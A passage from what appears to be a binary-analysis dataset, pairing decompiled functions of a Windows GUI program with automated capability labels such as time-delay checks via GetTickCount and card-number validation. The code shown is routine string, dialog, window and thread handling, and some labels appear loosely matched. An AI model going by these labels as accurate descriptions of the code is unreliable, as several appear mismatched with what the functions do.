        "decompiled_code": "\nint32_t __cdecl fcn.00420590(char *arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint8_t uVar5;\n    uint32_t uVar4;\n    \n    uVar4 = 0xff;\n    do {\n        do {\n            cVar2 = uVar4;\n            if (cVar2 == '\\0') goto code_r0x004205d6;\n            cVar2 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            cVar1 = *arg_8h;\n            uVar4 = CONCAT11(cVar1, cVar2);\n            arg_8h = arg_8h + 1;\n        } while (uVar4 >> 8 == cVar2);\n        uVar3 = cVar1 + 0xbf;\n        uVar3 = uVar3 + (-(uVar3 < 0x1a) & 0x20U) + 0x41;\n        uVar4 = CONCAT11(cVar2 + 0xbfU + (-(cVar2 + 0xbfU < 0x1a) & 0x20U) + 'A', uVar3);\n        uVar5 = uVar4 >> 8;\n    } while (uVar3 == uVar5);\n    cVar2 = (uVar3 < uVar5) * -2 + '\\x01';\ncode_r0x004205d6:\n    return cVar2;\n}\n",
        "token_count": 337
    },
    "00420c5f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00420c5f(ushort *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *arg_ch_00;\n    uint var_10h;\n    ushort uStack16;\n    ushort uStack14;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    iVar4 = 0x464c90;\n    if (arg_ch != 0) {\n        if (arg_ch < 0) {\n            arg_ch = -arg_ch;\n            iVar4 = 0x464df0;\n        }\n        if (arg_10h == 0) {\n            *arg_8h = 0;\n        }\n        while (arg_ch != 0) {\n            uVar1 = arg_ch >> 3;\n            uVar3 = arg_ch & 7;\n            iVar4 = iVar4 + 0x54;\n            arg_ch = uVar1;\n            if (uVar3 != 0) {\n                arg_ch_00 = iVar4 + uVar3 * 0xc;\n                if (0x7fff < *arg_ch_00) {\n                    var_10h._0_2_ = *arg_ch_00;\n                    var_10h._2_2_ = *arg_ch_00 >> 0x10;\n                    uStack16 = arg_ch_00[1];\n                    uStack14 = arg_ch_00[1] >> 0x10;\n                    uStack12 = arg_ch_00[2];\n                    iVar2 = CONCAT22(uStack16, var_10h._2_2_) + -1;\n                    var_10h._2_2_ = iVar2;\n                    uStack16 = iVar2 >> 0x10;\n                    arg_ch_00 = &var_10h;\n                }\n                fcn.00420a2d(arg_8h, arg_ch_00);\n            }\n        }\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 484
    },
    "0042155f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "set environment variable"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042155f(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uchar *puVar4;\n    bool bVar5;\n    uint var_10h;\n    uint var_ch;\n    uint lpValue;\n    uint var_4h;\n    \n    var_10h = 0;\n    if (arg_8h == NULL) {\n        return 0xffffffff;\n    }\n    arg_8h_00 = *arg_8h;\n    if (arg_8h_00 == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = fcn.00411e20(arg_8h_00, 0x3d);\n    if (iVar1 == 0) {\n        return 0xffffffff;\n    }\n    if (arg_8h_00 == iVar1) {\n        return 0xffffffff;\n    }\n    bVar5 = *(iVar1 + 1) == '\\0';\n    if (*0x4670a8 == *0x4670ac) {\n        *0x4670a8 = fcn.004214fe();\n    }\n    if (*0x4670a8 == NULL) {\n        if ((arg_ch != 0) && (*0x4670b0 != NULL)) {\n            iVar2 = fcn.0042099d();\n            if (iVar2 != 0) {\n                return 0xffffffff;\n            }\n            goto code_r0x00421614;\n        }\n        if (!bVar5) {\n            *0x4670a8 = fcn.0041101f(4);\n            if (*0x4670a8 == NULL) {\n                return 0xffffffff;\n            }\n            **0x4670a8 = 0;\n            if (*0x4670b0 == NULL) {\n                *0x4670b0 = fcn.0041101f(4);\n                if (*0x4670b0 == NULL) {\n                    return 0xffffffff;\n                }\n                **0x4670b0 = 0;\n            }\n            goto code_r0x00421614;\n        }\ncode_r0x004215e2:\n        var_10h = 0;\n    }\n    else {\ncode_r0x00421614:\n        piVar3 = *0x4670a8;\n        iVar2 = fcn.004214b1(arg_8h_00);\n        if ((iVar2 < 0) || (*piVar3 == 0)) {\n            if (bVar5) {\n                fcn.00411031(arg_8h_00);\n                *arg_8h = 0;\n                goto code_r0x004215e2;\n            }\n            if (iVar2 < 0) {\n                iVar2 = -iVar2;\n            }\n            piVar3 = fcn.00411e9b(*0x4670a8, iVar2 * 4 + 8);\n            if (piVar3 == NULL) {\n                return 0xffffffff;\n            }\n            piVar3[iVar2] = arg_8h_00;\n            (piVar3 + iVar2)[1] = 0;\n            *arg_8h = 0;\ncode_r0x004216b1:\n            *0x4670a8 = piVar3;\n        }\n        else {\n            piVar3 = piVar3 + iVar2;\n            fcn.00411031(*piVar3);\n            if (bVar5) {\n                for (; *piVar3 != 0; piVar3 = piVar3 + 1) {\n                    *piVar3 = piVar3[1];\n                    iVar2 = iVar2 + 1;\n                }\n                piVar3 = fcn.00411e9b(*0x4670a8, iVar2 << 2);\n                if (piVar3 != NULL) goto code_r0x004216b1;\n            }\n            else {\n                *piVar3 = arg_8h_00;\n                *arg_8h = 0;\n            }\n        }\n        if (arg_ch != 0) {\n            iVar2 = fcn.00411cb0(arg_8h_00);\n            iVar2 = fcn.0041101f(iVar2 + 2);\n            if (iVar2 != 0) {\n                fcn.004190f0(iVar2, arg_8h_00);\n                puVar4 = (iVar2 - arg_8h_00) + iVar1;\n                *puVar4 = 0;\n                iVar1 = (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(iVar2, ~-bVar5 & puVar4 + 1);\n                if (iVar1 == 0) {\n                    var_10h = 0xffffffff;\n                }\n                fcn.00411031(iVar2);\n            }\n        }\n        if (bVar5) {\n            fcn.00411031(arg_8h_00);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 1120
    },
    "0042552b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042552b(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    \n    var_24h = arg_8h;\n    var_28h = 0x18;\n    var_1ch = 0xf000;\n    var_20h = ((arg_ch != 0) + 1) * 0x1000;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x110d, 0, &var_28h);\n    return;\n}\n",
        "token_count": 162
    },
    "004289b8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n\nbool __cdecl\nfcn.004289b8(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    char cVar5;\n    bool bVar6;\n    uint var_8h;\n    uint var_ch_2;\n    uint hInstance;\n    uint var_10h;\n    uint var_48h;\n    uint var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint hMem;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = &stack0xffffffb8;\n    *(unaff_EBP + -0x20) = extraout_ECX;\n    if (*(unaff_EBP + 0x10) == 0) {\n        iVar1 = fcn.00444bf8();\n        *(unaff_EBP + 0x10) = *(iVar1 + 0xc);\n    }\n    iVar1 = fcn.00444bf8();\n    piVar2 = *(iVar1 + 0x1038);\n    *(unaff_EBP + -0x28) = piVar2;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.0042b08b(0x10);\n    fcn.0042b08b(0x7c000);\n    if (piVar2 == NULL) {\n        iVar1 = *(unaff_EBP + 8);\ncode_r0x00428a3c:\n        if (iVar1 != 0) {\n            piVar2 = fcn.004290ee();\n            iVar3 = (**(*piVar2 + 0xc))();\n            *(unaff_EBP + -0x1c) = iVar3 + 0x10;\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x18) = 0;\n            iVar3 = fcn.004305d7(iVar1, unaff_EBP + -0x1c, unaff_EBP + -0x18);\n            cVar5 = iVar3 == 0;\n            if (*0x466dfc == 0) {\ncode_r0x00428ab1:\n                if (cVar5 != '\\0') {\ncode_r0x00428ab5:\n                    fcn.00430503(iVar1);\n                    *(unaff_EBP + -4) = 2;\n                    fcn.00430429(*(unaff_EBP + -0x18));\n                    uVar4 = fcn.004301ac();\n                    *(unaff_EBP + -0x14) = uVar4;\n                    *(unaff_EBP + -4) = 1;\n                    fcn.0043019e();\n                    if (*(unaff_EBP + -0x14) != 0) {\n                        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(unaff_EBP + -0x14));\n                    }\n                }\n            }\n            else {\n                if (cVar5) goto code_r0x00428ab5;\n                iVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x2a);\n                if (iVar3 != 0) {\n                    iVar3 = fcn.004118cf(*(unaff_EBP + -0x1c), \"MS Shell Dlg\");\n                    cVar5 = '\\x01' - (iVar3 != 0);\n                    if (cVar5 != '\\0') {\n                        if (*(unaff_EBP + -0x18) == 8) {\n                            *(unaff_EBP + -0x18) = 0;\n                        }\n                        goto code_r0x00428ab1;\n                    }\n                }\n            }\n            extraout_ECX[0x10] = -1;\n            extraout_ECX[0xe] = extraout_ECX[0xe] | 0x10;\n            fcn.0042cef4(extraout_ECX);\n            if (*(unaff_EBP + 0xc) == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = *(*(unaff_EBP + 0xc) + 0x1c);\n            }\n            iVar1 = (*_sym.imp.USER32.dll_CreateDialogIndirectParamA)\n                              (*(unaff_EBP + 0x10), iVar1, uVar4, fcn.004283b1, 0);\n            fcn.00401200();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*(unaff_EBP + -0x28) != NULL) {\n                (**(**(unaff_EBP + -0x28) + 0x14))(unaff_EBP + -0x48);\n                if (iVar1 != 0) {\n                    (**(*extraout_ECX + 300))(0);\n                }\n            }\n            iVar3 = fcn.0042b4da();\n            if (iVar3 == 0) {\n                (**(*extraout_ECX + 0x114))();\n            }\n            if ((iVar1 != 0) && ((*(extraout_ECX + 0xe) & 0x10) == 0)) {\n                (*_sym.imp.USER32.dll_DestroyWindow)(iVar1);\n                iVar1 = 0;\n            }\n            if (*(unaff_EBP + -0x14) != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*(unaff_EBP + -0x14));\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(*(unaff_EBP + -0x14));\n            }\n            bVar6 = iVar1 != 0;\n            goto code_r0x00428bb4;\n        }\n    }\n    else {\n        iVar1 = (**(*extraout_ECX + 300))(unaff_EBP + -0x48);\n        if (iVar1 != 0) {\n            iVar1 = (**(*piVar2 + 0x10))(unaff_EBP + -0x48, *(unaff_EBP + 8));\n            goto code_r0x00428a3c;\n        }\n    }\n    bVar6 = false;\ncode_r0x00428bb4:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return bVar6;\n}\n",
        "token_count": 1618
    },
    "0042aa4d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042aa4d(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_24h;\n    int32_t var_14h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.0042a9da(arg_8h, &var_8h, &var_4h);\n    iVar1 = fcn.00429cb3(arg_8h, &var_24h, 2);\n    if (iVar1 != 0) {\n        var_4h = var_4h - (-(var_14h != 1) & var_14h - 1U);\n    }\n    return var_4h;\n}\n",
        "token_count": 163
    },
    "0042ad21": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ad21(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_60h;\n    uint lprcSrc;\n    int32_t lpPoints;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t lprcDst;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.0042dd19();\n    if (arg_8h == 0) {\n        if ((var_4h & 0x40000000) == 0) {\n            iVar5 = (*_sym.imp.USER32.dll_GetWindow)(*(in_ECX + 0x1c), 4);\n        }\n        else {\n            iVar5 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x1c));\n        }\n        if ((iVar5 != 0) && (iVar4 = (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x36b, 0, 0),  iVar4 != 0)) {\n            iVar5 = iVar4;\n        }\n    }\n    else {\n        iVar5 = *(arg_8h + 0x1c);\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowRect;\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x1c), &var_28h);\n    if ((var_4h & 0x40000000) == 0) {\n        if ((iVar5 != 0) &&\n           ((uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar5, 0xfffffff0),  (uVar2 & 0x10000000) == 0 ||\n            ((uVar2 & 0x20000000) != 0)))) {\n            iVar5 = 0;\n        }\n        if (iVar5 == 0) {\n            iVar5 = fcn.0040a3cd();\n            if (iVar5 != 0) {\n                iVar5 = *(iVar5 + 0x1c);\n            }\n            uVar3 = fcn.0040ad84(iVar5, 1);\n            fcn.0040adef(uVar3, iVar5);\n            pcVar1 = _sym.imp.USER32.dll_CopyRect;\n            (*_sym.imp.USER32.dll_CopyRect)(&lpPoints, &lprcSrc);\n            (*pcVar1)(&lprcDst, &lprcSrc);\n        }\n        else {\n            (*pcVar1)(iVar5, &lpPoints);\n            uVar3 = fcn.0040ad84(iVar5, 2);\n            fcn.0040adef(uVar3, iVar5);\n            (*_sym.imp.USER32.dll_CopyRect)(&lprcDst, &lprcSrc);\n        }\n    }\n    else {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x1c));\n        pcVar1 = _sym.imp.USER32.dll_GetClientRect;\n        (*_sym.imp.USER32.dll_GetClientRect)(uVar3, &lprcDst);\n        (*pcVar1)(iVar5, &lpPoints);\n        (*_sym.imp.USER32.dll_MapWindowPoints)(iVar5, uVar3, &lpPoints, 2);\n    }\n    iVar5 = (lpPoints + var_30h) / 2 - (var_20h - var_28h) / 2;\n    iVar4 = (var_34h + var_2ch) / 2 - (var_1ch - var_24h) / 2;\n    if ((lprcDst <= iVar5) && (lprcDst = iVar5,  var_10h < (var_20h - var_28h) + iVar5)) {\n        lprcDst = (var_10h - var_20h) + var_28h;\n    }\n    if ((var_14h <= iVar4) && (var_14h = iVar4,  var_ch < (var_1ch - var_24h) + iVar4)) {\n        var_14h = (var_24h - var_1ch) + var_ch;\n    }\n    fcn.0042e037(0, lprcDst, var_14h, 0xffffffff, 0xffffffff, 0x15);\n    return;\n}\n",
        "token_count": 1085
    },
    "0042c5de": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042c5de(uint noname_0, uint *hWnd, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    uint var_ch;\n    uint *var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = *hWnd;\n    var_4h = (*_sym.imp.USER32.dll_GetDlgCtrlID)(uVar3);\n    var_4h = var_4h & 0xffff;\n    uVar1 = hWnd[2];\n    iVar2 = fcn.00446580(0x443d27);\n    if ((*(iVar2 + 0xdc) != in_ECX[7]) && (iVar2 = fcn.0042bfd9(uVar3, arg_10h),  iVar2 == 0)) {\n        var_ch = arg_10h;\n        var_8h = hWnd;\n        uVar3 = (**(*in_ECX + 0xc))(var_4h, uVar1 & 0xffff | 0x4e0000, &var_ch, 0);\n        return uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 276
    },
    "0042f589": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042f589(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t hHandle;\n    int32_t hEvent;\n    int32_t var_4h;\n    \n    fcn.00411850(&var_1ch, 0, 0x1c);\n    var_1ch = fcn.00444bc2();\n    pcVar1 = _sym.imp.KERNEL32.dll_CreateEventA;\n    hHandle = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 1, 0, 0);\n    hEvent = (*pcVar1)(0, 1, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    var_14h = arg_8h;\n    if (hHandle != 0) {\n        if (hEvent != 0) {\n            iVar2 = fcn.004124f5(arg_10h, arg_ch, 0x42f45b, &var_1ch, arg_8h | 4, in_ECX + 0x2c);\n            *(in_ECX + 0x28) = iVar2;\n            if (iVar2 == 0) {\n                return 0;\n            }\n            (*_sym.imp.KERNEL32.dll_ResumeThread)(iVar2);\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hHandle, 0xffffffff);\n            (*pcVar1)(hHandle);\n            if ((arg_8h & 4) != 0) {\n                (*_sym.imp.KERNEL32.dll_SuspendThread)(*(in_ECX + 0x28));\n            }\n            if (var_4h == 0) {\n                (*_sym.imp.KERNEL32.dll_SetEvent)(hEvent);\n                return 1;\n            }\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(in_ECX + 0x28), 0xffffffff);\n            (*pcVar1)(*(in_ECX + 0x28));\n            *(in_ECX + 0x28) = 0;\n            goto code_r0x0042f65e;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hHandle);\n    }\n    if (hEvent == 0) {\n        return 0;\n    }\ncode_r0x0042f65e:\n    (*pcVar1)(hEvent);\n    return 0;\n}\n",
        "token_count": 582
    },
    "0042ff21": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nuint fcn.0042ff21(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    uVar2 = 0;\n    iVar1 = *(extraout_ECX + 0xc);\n    *(unaff_EBP + -0x10) = &var_14h;\n    if (iVar1 != 0) {\n        *(unaff_EBP + -0x14) = 0;\n        *(unaff_EBP + -4) = 0;\n        uVar2 = (**(extraout_ECX + 0xc))();\n        *(unaff_EBP + -0x14) = uVar2;\n        uVar2 = *(unaff_EBP + -0x14);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 272
    },
    "0043251a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043251a(uint arg_8h, int32_t lpFileTime)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    uint uVar4;\n    uint *puStack44;\n    uint lpSystemTime;\n    uint var_12h;\n    ushort var_eh;\n    ushort var_ch;\n    ushort var_ah;\n    uint lpLocalFileTime;\n    \n    if (lpFileTime == 0) {\n        puStack44 = 0x4651d0;\n        fcn.00411d3b(&stack0xffffffd4, 0x45d1dc);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    lpSystemTime._0_2_ = fcn.0040fc09();\n    lpSystemTime._2_2_ = fcn.0040fc20();\n    puStack44 = 0x43254d;\n    iVar2 = fcn.004134e4(arg_8h);\n    if (iVar2 == 0) {\n        var_12h._0_2_ = 0;\n    }\n    else {\n        var_12h._0_2_ = *(iVar2 + 0xc);\n    }\n    var_12h._2_2_ = fcn.0040fc45();\n    var_eh = fcn.0040fc58();\n    puStack44 = 0x43257c;\n    puVar3 = fcn.004134e4(arg_8h);\n    if (puVar3 == NULL) {\n        var_ch = 0xffff;\n    }\n    else {\n        var_ch = *puVar3;\n    }\n    puStack44 = &fcn.0043251a::lpSystemTime;\n    var_ah = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar2 == 0) {\n        puStack44 = (*_sym.imp.KERNEL32.dll_GetLastError)(0);\n        fcn.004323b3();\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalFileTimeToFileTime)(&fcn.0043251a::lpLocalFileTime, lpFileTime);\n    if (iVar2 == 0) {\n        uVar4 = (*pcVar1)(0);\n        fcn.004323b3(uVar4);\n    }\n    return;\n}\n",
        "token_count": 556
    },
    "00434b8c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434b8c(uint hWnd, uint lpString2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lpString1;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString2);\n    if (uVar1 < 0x101) {\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, &lpString1, 0x100);\n        if (uVar2 == uVar1) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(&lpString1, lpString2);\n            if (iVar3 == 0) goto code_r0x00434be7;\n        }\n    }\n    (*_sym.imp.USER32.dll_SetWindowTextA)(hWnd, lpString2);\ncode_r0x00434be7:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 236
    },
    "0043a7b2": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043a7b2(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    bool bVar5;\n    uint var_20h;\n    uint var_18h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    if (arg_14h == 0) {\n        arg_14h = arg_10h;\n        var_4h = fcn.0043a282(arg_8h, arg_ch, arg_10h);\n        iVar1 = fcn.0043a282(arg_8h, arg_ch, 0);\n        if ((iVar1 != var_4h) && (0 < arg_10h)) {\n            do {\n                iVar1 = (arg_14h + iVar4) / 2;\n                iVar2 = fcn.0043a282(arg_8h, arg_ch, iVar1);\n                if ((iVar2 != var_4h) && (bVar5 = iVar4 == iVar1,  iVar4 = iVar1,  iVar1 = arg_14h,  bVar5)) {\n                    fcn.0043a282(arg_8h, arg_ch, arg_14h);\n                    break;\n                }\n                arg_14h = iVar1;\n            } while (iVar4 < arg_14h);\n        }\n        fcn.0043a690(&var_10h, arg_8h, arg_ch);\n        iVar1 = var_10h;\ncode_r0x0043a92a:\n        fcn.0043a282(arg_8h, arg_ch, iVar1);\n    }\n    else {\n        fcn.0043a282(arg_8h, arg_ch, 0);\n        piVar3 = fcn.0043a690(&var_10h, arg_8h, arg_ch);\n        iVar4 = *piVar3;\n        var_4h = piVar3[1];\n        var_8h = iVar4;\n        fcn.0043a282(arg_8h, arg_ch, 0x7fff);\n        piVar3 = fcn.0043a690(&var_18h, arg_8h, arg_ch);\n        iVar1 = *piVar3;\n        var_ch = piVar3[1];\n        var_10h = iVar1;\n        if (iVar4 < iVar1) {\n            do {\n                fcn.0043a282(arg_8h, arg_ch, (iVar4 + iVar1) / 2);\n                piVar3 = fcn.0043a690(&var_18h, arg_8h, arg_ch);\n                iVar4 = piVar3[1];\n                if (arg_10h < iVar4) {\n                    iVar4 = fcn.0040ff53(*piVar3, iVar4);\n                    if (iVar4 != 0) goto code_r0x0043a92a;\n                    var_8h = *piVar3;\n                    var_4h = piVar3[1];\n                }\n                else {\n                    if (arg_10h <= iVar4) {\n                        return;\n                    }\n                    iVar4 = fcn.0040ff53(*piVar3, piVar3[1]);\n                    iVar1 = var_8h;\n                    if (iVar4 != 0) goto code_r0x0043a92a;\n                    iVar1 = *piVar3;\n                    var_ch = piVar3[1];\n                    var_10h = iVar1;\n                }\n                iVar4 = var_8h;\n            } while (var_8h < iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 858
    },
    "0043aa9f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043aa9f(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_SetRectEmpty)(&var_10h);\n    fcn.0043bb81(&var_10h, (*(in_ECX + 0x7c) & 0xa000) != 0);\n    *arg_ch = *arg_ch + var_10h;\n    arg_ch[1] = arg_ch[1] + var_ch;\n    if (*0x463e34 < 0x40047) {\n        arg_ch[1] = arg_ch[1] + -2;\n    }\n    arg_ch[2] = arg_ch[2] + var_8h;\n    arg_ch[3] = arg_ch[3] + var_4h;\n    return;\n}\n",
        "token_count": 226
    },
    "0043da4c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043da4c(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = *(in_ECX + 0xa8);\n    puVar1 = in_ECX + 0xac;\n    uVar2 = *puVar1;\n    uVar3 = *(in_ECX + 0xb0);\n    uVar4 = *(in_ECX + 0xb4);\n    uVar5 = *(in_ECX + 0xb8);\n    *(in_ECX + 0xa8) = *arg_ch == 0;\n    (*_sym.imp.USER32.dll_CopyRect)(puVar1, arg_ch + 1);\n    fcn.0043c1e6(arg_8h, arg_ch);\n    *puVar1 = uVar2;\n    *(in_ECX + 0xb0) = uVar3;\n    *(in_ECX + 0xb4) = uVar4;\n    *(in_ECX + 0xb8) = uVar5;\n    *(in_ECX + 0xa8) = uVar6;\n    return;\n}\n",
        "token_count": 312
    },
    "0043db58": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0043db58(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint noname_3, uint noname_4, int32_t arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    bool bVar5;\n    bool bVar6;\n    int32_t lpRect;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar4 = *(in_ECX + 0x7c) & 0xa000;\n    var_ch = 0;\n    var_8h = 0;\n    var_10h = 0;\n    var_4h = 0;\n    if (0 < *(in_ECX + 0x9c)) {\n        do {\n            iVar3 = var_4h;\n            piVar1 = fcn.0043db39();\n            if ((piVar1 == NULL) || (iVar2 = (**(*piVar1 + 0x150))(),  iVar2 == 0)) {\n                var_10h = var_10h + (var_8h - *0x466dbc);\n                var_8h = 0;\n                iVar3 = arg_20h;\n                if (uVar4 == 0) {\n                    iVar3 = arg_1ch;\n                }\n                if (iVar3 < var_10h) {\n                    if (var_4h == 0) {\n                        fcn.0042782d(var_ch + 1, 0, 1);\n                    }\n                    iVar3 = var_ch + 1;\n                    goto code_r0x0043dc59;\n                }\ncode_r0x0043dc28:\n                var_ch = var_4h;\n            }\n            else {\n                (*_sym.imp.USER32.dll_GetWindowRect)(piVar1[7], 